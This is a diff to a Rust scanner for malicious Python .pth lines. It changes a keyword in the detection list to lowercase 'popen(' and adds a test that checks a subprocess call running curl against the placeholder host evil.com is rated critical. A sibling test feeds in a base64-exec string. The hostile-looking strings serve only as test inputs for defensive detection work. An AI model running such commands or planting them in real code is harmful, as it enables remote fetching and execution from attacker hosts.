@@ -117,7 +117,7 @@ const CRITICAL_KEYWORDS: &[&str] = &[
     "subprocess",
     "os.system(",
     "os.popen(",
-    "Popen(",
+    "popen(",
 ];
 
 /// Analyse a single `.pth` line and return a verdict.
@@ -453,6 +453,12 @@ mod tests {
     fn evasion_mixed_case_does_not_bypass() {
         let result = analyse_pth_line("EXEC(base64.b64decode('payload'))");
         assert!(result.level() >= ThreatLevel::Warning);
+    }
+
+    #[test]
+    fn popen_detected_as_critical_regardless_of_case() {
+        let result = analyse_pth_line("Popen(['curl','evil.com'])");
+        assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     // ============================================================
